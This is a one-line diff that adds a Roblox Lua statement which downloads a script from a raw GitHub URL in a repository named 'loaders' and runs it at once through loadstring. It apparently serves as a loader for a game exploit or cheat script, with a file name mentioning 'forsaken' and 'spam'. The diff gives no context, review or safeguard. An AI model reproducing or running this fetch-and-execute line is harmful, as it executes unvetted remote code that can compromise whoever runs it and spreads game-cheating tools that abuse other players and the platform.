@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/upd-forsaken-spam0-w63x8mu1e08azk.lua"))()
